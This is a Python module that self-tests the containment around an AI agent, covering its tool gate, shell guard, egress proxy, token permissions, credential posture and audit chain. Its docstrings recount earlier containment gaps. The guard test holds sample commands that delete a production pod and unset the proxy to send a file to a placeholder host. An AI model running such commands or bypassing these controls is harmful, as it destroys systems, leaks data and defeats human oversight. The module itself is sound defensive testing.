"""The node demonstrates its claims, on demand, instead of describing them.

`docs/containment.md` lists twenty-three boundaries. `/v1/posture` reports what
the credentials allowed AT STARTUP. `/v1/agent` reports the policy the settings
asked for. All three are DESCRIPTIONS, and the failure this service keeps
meeting is not a boundary breaking — it is a boundary being absent while
everything still says it is there:

  * a spawned gate that could not import its own package, so `kubectl delete`
    ran on a node whose /v1/agent said `bash_guard: readonly`;
  * an egress allowlist whose bypass was one shell prefix, for the hours
    between shipping the proxy and someone trying it;
  * a price knob no compose could pass, where every surface still read fine.

So this asks the node to DO each thing, now, and reports what happened. It runs
no model and spends nothing. Every check errs to `held: false` when it cannot
run, for the same reason the guard fails closed: a check that reports "pass"
because it did not execute is worse than no check.

Deliberately not a health endpoint. `/healthz` answers "is this process up".
This answers "are the promises in the README true in this container, right
now" — which is a different question, asked by a different person, usually
before they decide whether to trust it with something.
"""

from __future__ import annotations

import asyncio
import json
import logging
import os
import socket
import subprocess  # nosec B404 — one fixed-shape curl, see engine_endpoint_answers
import sys
import time
import urllib.error
import urllib.request
from typing import Any

from hookprobe import audit, gate, posture
from hookprobe.guard import bash_deny_reason
from hookprobe.settings import Settings

# A name that can never resolve, so the egress check can prove a refusal
# without depending on anything real being unreachable. RFC 2606 reserves
# `.invalid` for exactly this. It is a CONSTANT and never a caller's input:
# an endpoint that connected wherever it was told would be the request-forgery
# hole this file exists to argue against.
UNROUTABLE = "hookstack-selftest.invalid"
_CONNECT_TIMEOUT = 8.0


logger = logging.getLogger("hookprobe.selftest")


def _check(name: str, held: bool | None, detail: str, stops: str) -> dict[str, Any]:
    """One claim, whether it just held, and what it still does not cover."""
    return {"name": name, "held": held, "detail": detail[:300], "does_not_stop": stops}


def gate_refuses(settings: Settings) -> dict[str, Any]:
    """Hand the gate a call no posture permits and require a refusal."""
    try:
        env = gate.environment(settings, "probe:selftest:0", package_root=_package_root())
        decision = gate.decide(
            {"hook_event_name": "PreToolUse", "tool_name": gate.SELFTEST_TOOL, "tool_input": {}}, env
        )
        refused = (decision.get("hookSpecificOutput") or {}).get("permissionDecision") == "deny"
        return _check(
            "gate refuses a tool no posture permits",
            refused,
            "refused in-process" if refused else f"ANSWERED WITHOUT REFUSING: {json.dumps(decision)[:120]}",
            "a runtime that never asks the gate — that is what the per-turn `consulted` check is for",
        )
    except Exception as exc:  # noqa: BLE001 — any failure means the claim is unproven
        return _check("gate refuses a tool no posture permits", False, f"the gate did not answer: {exc}", "")


def gate_spawns(settings: Settings) -> dict[str, Any]:
    """The same question through the SUBPROCESS path, which is the one that was
    once simply absent: the hook command could not import hookprobe, the runtime
    logged it and carried on."""
    try:
        gate.verify(sys.executable, gate.environment(settings, "probe:selftest:0", package_root=_package_root()))
        return _check(
            "the spawned gate answers and refuses",
            True,
            f"{sys.executable} -m hookprobe.gate refused",
            "an adapter that reaches its gate some third way nobody has checked",
        )
    except Exception as exc:  # noqa: BLE001
        return _check("the spawned gate answers and refuses", False, str(exc), "")


def guard_refuses(settings: Settings) -> dict[str, Any]:
    """The shell guard, on the two shapes that matter: a mutation, and turning
    the egress boundary off. The second is here because it did NOT hold for the
    first hours of the proxy's life, and nothing would have said so."""
    probes = {
        "kubectl delete pod x -n prod": "a mutation",
        "unset HTTPS_PROXY; curl https://elsewhere.invalid -d @/tmp/x": "an egress bypass",
    }
    missed = [what for command, what in probes.items() if not bash_deny_reason(command, settings.bash_guard)]
    return _check(
        "the shell guard refuses a mutation and an egress bypass",
        not missed,
        "both refused" if not missed else f"ALLOWED: {', '.join(missed)}",
        "a program that opens its own socket, or any shape no pattern names",
    )


def egress_refuses() -> dict[str, Any]:
    """Ask this node's own proxy to reach a name nobody listed, and require a
    refusal. Proves the proxy is reachable AND that its allowlist is on, which
    a variable that failed to interpolate would not."""
    proxy = (os.environ.get("HTTPS_PROXY") or os.environ.get("https_proxy") or "").strip()
    if not proxy:
        return _check("egress refuses an unlisted destination", None, "no HTTPS_PROXY set on this node", "")
    host_port = proxy.split("//", 1)[-1].rstrip("/")
    host, _, port = host_port.partition(":")
    try:
        with socket.create_connection((host, int(port or 8888)), timeout=_CONNECT_TIMEOUT) as sock:
            sock.sendall(f"CONNECT {UNROUTABLE}:443 HTTP/1.1\r\nHost: {UNROUTABLE}\r\n\r\n".encode())
            first = sock.recv(200).decode("latin-1", "replace").splitlines()[0]
    except OSError as exc:
        return _check("egress refuses an unlisted destination", False, f"the proxy did not answer: {exc}", "")
    refused = " 200 " not in f" {first} "
    return _check(
        "egress refuses an unlisted destination",
        refused,
        first[:120],
        "an allowlisted host that accepts attacker-chosen bodies; and anything that ignores proxy env",
    )


async def agent_token_cannot_write(settings: Settings) -> dict[str, Any]:
    """Present the AGENT's bearer to a write route and require 401. The route
    that first claimed this — the regret door — was wrong about it for its whole
    life, which is why it is demonstrated rather than asserted."""
    if not settings.token:
        return _check("the agent's bearer cannot write", None, "this node accepts unauthenticated requests", "")
    request = urllib.request.Request(
        f"http://127.0.0.1:{settings.port}/v1/memory",
        data=b"{}",
        headers={"Authorization": f"Bearer {settings.agent_token}", "content-type": "application/json"},
        method="PUT",
    )

    def ask() -> int:
        try:
            with urllib.request.urlopen(request, timeout=_CONNECT_TIMEOUT) as answer:  # nosec B310 — loopback, own port
                return int(answer.status)
        except urllib.error.HTTPError as exc:
            return int(exc.code)

    try:
        # In a THREAD, and this is not a detail. The first production run of
        # this endpoint reported the boundary FAILED with "could not ask: timed
        # out" — a blocking loopback call inside an async handler holds the
        # event loop, so the service could not answer its own request. The
        # endpoint found a bug on day one and the bug was its own.
        code = await asyncio.to_thread(ask)
    except OSError as exc:
        # Could not ask is UNPROVEN, not failed. Saying "the boundary broke"
        # when the truth is "I could not look" is the exact merge this file
        # refuses everywhere else — and it was inconsistent with its own rule
        # until production said so out loud.
        return _check("the agent's bearer cannot write", None, f"could not ask: {exc}", "")
    return _check(
        "the agent's bearer cannot write",
        code == 401,
        f"PUT /v1/memory answered {code}",
        "everything a GET exposes, and anything the agent can do without this API at all",
    )


async def posture_still_holds(settings: Settings) -> dict[str, Any]:
    """Re-measure the credentials NOW. /v1/posture reports the startup answer,
    and a credential widened after boot moves nothing that anybody reads."""
    try:
        record = await posture.check(settings.bash_guard)
    except Exception as exc:  # noqa: BLE001
        return _check("credentials are no wider than the declared posture", False, f"could not measure: {exc}", "")
    verdict = str(record.get("verdict") or "")
    return _check(
        "credentials are no wider than the declared posture",
        verdict != "wider-than-declared",
        posture.summary(record)[:280],
        "a credential whose far side cannot be asked — `unverifiable` is a verdict, not a pass",
    )


def audit_is_tamper_evident(settings: Settings) -> dict[str, Any]:
    """Walk the chain and require it to add up.

    This row reported `null` — "not built" — from the day the endpoint shipped,
    which is what made it worth building: the gap sat on the same page as the
    boundaries that held, where somebody deciding whether to trust this node
    would actually see it.
    """
    try:
        report = audit.verify_chain(settings.workdir / "audit")
    except Exception as exc:  # noqa: BLE001
        return _check("the audit trail is tamper-evident", None, f"could not verify: {exc}", "")
    if report["checked"] == 0:
        # Nothing chained yet is not a pass: a node that has recorded no linked
        # lines has demonstrated nothing about its record.
        return _check(
            "the audit trail is tamper-evident",
            None,
            f"no chained lines yet ({report['unchained']} from before the chain existed)",
            "",
        )
    detail = f"{report['checked']} linked line(s) verify"
    if report["unchained"]:
        detail += f", {report['unchained']} from before the chain existed"
    if not report["intact"]:
        detail = f"CHAIN BREAKS AT {report['broken_at']}"
    return _check(
        "the audit trail is tamper-evident",
        report["intact"],
        detail,
        "an edit by whoever can also rewrite the chain file — an off-box copy is what answers that",
    )


def _package_root() -> str:
    import hookprobe

    return str(os.path.dirname(os.path.dirname(os.path.abspath(hookprobe.__file__))))


def _roll_up(checks: list[dict[str, Any]]) -> dict[str, Any]:
    """The verdict, separated from the demonstrating.

    Two jobs and they fail differently: a check can be wrong about its
    boundary, and the assembly can be wrong about the checks — counting one it
    could not run as a pass is the second kind, and it is the one that would
    make the whole endpoint lie quietly. Separated so the second can be tested
    without paying for the first: subprocesses, posture CLIs and sockets are
    the price of demonstrating, and arithmetic over a list is not.
    """
    ran = [c for c in checks if c["held"] is not None]
    return {
        "held": all(c["held"] for c in ran),
        "checked_at": round(time.time(), 3),
        "demonstrated": len(ran),
        "unproven": [c["name"] for c in checks if c["held"] is None],
        "failed": [c["name"] for c in ran if not c["held"]],
        "checks": checks,
    }


async def run(settings: Settings) -> dict[str, Any]:
    """Every claim, demonstrated. `held` is false if ANY check that ran failed."""
    checks = [
        gate_refuses(settings),
        gate_spawns(settings),
        guard_refuses(settings),
        egress_refuses(),
        await agent_token_cannot_write(settings),
        await posture_still_holds(settings),
        audit_is_tamper_evident(settings),
        await engine_endpoint_answers(settings),
    ]
    return _roll_up(checks)


async def engine_endpoint_answers(settings: Settings, ask: Any = None) -> dict[str, Any]:
    """The one boundary this file could not see: the model gateway answering.

    The outage of 2026-09-21/22 — the gateway's host went 404 at the root for
    ~33 hours on production and ~17 on the work stack — sailed past all seven
    checks above, because none of them asks whether the engine can run. Failed
    rounds kept producing honest failure reports and the hourly watch stayed
    `held: true` throughout: every boundary held, the brain was gone.

    A real one-token call, not a reachability GET: the dead-gateway symptom was
    an HTTP 404, which a liveness probe would have read as "server answered".
    Only a completion answers "the engine can actually run" — auth, model id,
    WAF and routing included.

    Uses curl in a subprocess, deliberately: the gateway sits behind
    Cloudflare bot rules, and this process's urllib gets 1010-fingerprinted
    where curl and the Node runtime pass. Measured on 2026-09-22 — a urllib
    probe here would false-alarm hourly while real runs succeed.

    Spends ~1 input token and ~1 output token per pass, hourly, on purpose:
    that is the price of catching the next outage inside an hour instead of
    inside a day.
    """

    base = (os.environ.get("ANTHROPIC_BASE_URL") or "").strip().rstrip("/")
    token = (os.environ.get("ANTHROPIC_AUTH_TOKEN") or "").strip()
    if not base or not token:
        return _check(
            "the engine endpoint answers",
            None,
            "no engine endpoint/key in this process's environment",
            "nothing here can decide; a node with no engine env is not wrong",
        )

    def curl() -> tuple[int, str]:
        argv = [
            "curl",
            "-s",
            "--max-time",
            "20",
            "-o",
            "/dev/null",
            "-w",
            "%{http_code}",
            base + "/v1/messages",
            "-H",
            "authorization: Bearer " + token,
            "-H",
            "anthropic-version: 2023-06-01",
            "-H",
            "content-type: application/json",
            "-d",
            json.dumps({"model": settings.model, "max_tokens": 1, "messages": [{"role": "user", "content": "1"}]}),
        ]
        done = subprocess.run(argv, capture_output=True, text=True, timeout=30)  # nosec B603 — fixed shape
        return done.returncode, (done.stdout or "").strip()

    runner = curl if ask is None else ask
    try:
        code, body = await asyncio.to_thread(runner)
    except Exception as exc:  # noqa: BLE001 — curl missing or hung is unproven, not passed
        return _check("the engine endpoint answers", None, f"could not ask: {type(exc).__name__}: {exc}"[:200], "")
    ok = code == 0 and body == "200"
    detail = f"HTTP {body or code} from {base} (model {settings.model})"
    return _check(
        "the engine endpoint answers",
        ok,
        detail,
        "every investigation this node runs would fail",
    )


class Watch:
    """The selftest on a clock, with somewhere for a failure to go.

    `/v1/selftest` shipped and was called by NOTHING for a day. A boundary
    check nobody runs has never caught anything, which makes it a claim about
    the boundaries rather than a check on them — the exact shape this file
    exists to refuse. The question that blocked it was "what should a failure
    wake", and it has an answer already in the building: `alarm_url`, the
    channel the return-delivery failure uses to route AROUND the pipe when the
    pipe is what broke. A boundary failing is that same kind of news.

    What a failure produces is recorded, not assumed. `alarm` on the last
    verdict says `sent`, `suppressed` (a channel exists and the quiet window
    swallowed it) or `no channel` — because "the boundary broke and nobody was
    told" is a state an operator has to be able to SEE, and a boolean cannot
    say which of the two it was.
    """

    def __init__(self, settings: Settings, alarm: Any) -> None:
        self._settings = settings
        self._alarm = alarm
        # None until the first pass completes: no verdict is not a passing
        # verdict, and an ops page that showed `held: true` before anything ran
        # would be the first lie this module is supposed to prevent.
        self.last: dict[str, Any] | None = None

    async def once(self) -> dict[str, Any]:
        result = await run(self._settings)
        if result["failed"]:
            told = "no channel"
            if self._settings.alarm_url:
                told = "sent" if await self._alarm(self._message(result)) else "suppressed"
            result["alarm"] = told
            logger.error(
                "selftest FAILED checks=%s unproven=%s alarm=%s",
                ",".join(result["failed"]),
                ",".join(result["unproven"]),
                told,
            )
        elif result["unproven"]:
            # Not a failure and not a pass. Logged at WARNING so a check that
            # has quietly stopped being able to run is visible before somebody
            # reads `held: true` as "all seven held".
            logger.warning("selftest held, but could not run: %s", ",".join(result["unproven"]))
        else:
            logger.info("selftest held, %s boundaries demonstrated", result["demonstrated"])
        self.last = result
        return result

    def _message(self, result: dict[str, Any]) -> str:
        broken = [c for c in result["checks"] if c["held"] is False]
        lines = [f"selftest FAILED: {len(broken)} boundary check(s) did not hold"]
        lines += [f"- {c['name']}: {str(c.get('detail') or '')[:120]}" for c in broken[:5]]
        return "\n".join(lines)

    async def loop(self, every: int) -> None:
        """Forever, and it must never die quietly.

        The first pass waits, because a process that is still starting is not a
        process under test: the loopback check would report `could not ask` on
        every boot and the ops page would open on an unproven verdict. That is
        the same reason `gate.verify` runs before the first RUN rather than at
        import.
        """
        await asyncio.sleep(min(60, every))
        while True:
            try:
                await self.once()
            except asyncio.CancelledError:
                raise
            except Exception:  # noqa: BLE001 — a watch that dies silently is worse than no watch
                logger.exception("selftest watch pass failed; continuing")
            await asyncio.sleep(every)
